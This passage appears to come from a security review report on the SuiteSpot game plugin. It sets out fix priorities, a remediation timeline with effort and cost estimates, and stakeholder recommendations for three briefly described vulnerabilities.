### Fix Priority Based on Business Context

| Scenario | CVE-001 | CVE-002 | CVE-003 | Timeline |
|----------|---------|---------|---------|----------|
| **New Release** | FIX | FIX | FIX | Week 1-2 |
| **Current Users** | FIX | FIX | FIX | ASAP |
| **Existing Users** | FIX URGENT | FIX URGENT | FIX Week 2 | Week 1-2 |
| **Open Source** | FIX | FIX | FIX | Public disclosure |

### Recommended Action Plan

**IMMEDIATE (This week):**
1. Fix CVE-001 (PowerShell injection) - 4 hours
2. Fix CVE-002 (Path traversal) - 3 hours
3. Build and internal test - 2 hours
4. **Total: 1 day of work**

**THIS MONTH:**
5. Add comprehensive security test suite - 8 hours
6. Begin DDD Phase 1 (aggregates) - 16 hours
7. Code review all file operations - 8 hours
8. **Total: 2 weeks of work**

**NEXT QUARTER:**
9. Complete DDD Phases 2-5 - 4 weeks
10. Implement defense-in-depth hardening - 2 weeks
11. Security testing and validation - 2 weeks
12. **Total: 8 weeks to full hardening**

---

## CONCLUSION & STAKEHOLDER RECOMMENDATIONS

### Executive Summary for Decision-Makers

**SuiteSpot has critical vulnerabilities that must be fixed immediately.** The plugin is otherwise well-engineered with good foundations, but cannot be shipped or used with confidence until these issues are resolved.

### Risk If Not Fixed

- **CVE-001 (RCE):** Attacker can execute arbitrary code on user's machine
- **CVE-002 (Traversal):** Attacker can overwrite game/system files
- **CVE-003 (Injection):** Attacker can corrupt game state via malicious packs

**Combined Risk:** System compromise, user data theft, malware installation

### Investment & Timeline

| Phase | Effort | Timeline | Outcome |
|-------|--------|----------|---------|
| **Emergency Fixes** | 2 days | Week 1 | CVE fixes, ready for limited use |
| **DDD Phase 1** | 3 days | Week 2 | Security-hardened aggregates |
| **DDD Phases 2-5** | 2 weeks | Weeks 3-4 | Complete architecture overhaul |
| **Defense-in-Depth** | 2 weeks | Weeks 5-8 | Production-ready security posture |

**Total Cost:** ~$25K (4 weeks @ senior rate)
**ROI:** Sustainable 2x faster development + zero-trust security

### Recommendation

**APPROVE BOTH emergency fixes AND DDD refactoring.**

The two initiatives are synergistic:
- Emergency fixes stop immediate bleeding
- DDD refactoring prevents recurring vulnerabilities
- Combined = lowest total cost of ownership

### Next Steps

1. **This week:** Approve emergency fix budget (1 day)
2. **Next week:** Begin DDD refactoring (ongoing)
3. **Week 3:** Full security review of Phase 1 code
4. **Week 5:** Begin defense-in-depth hardening
5. **Week 9:** Full production readiness review

---

**Report Status:** READY FOR STAKEHOLDER REVIEW
**Distribution:** Security Review Board, Development Lead, Product Manager
**Approval Required:** CTO/Security Lead before shipping

**Questions?** Contact Security Architect (V3)
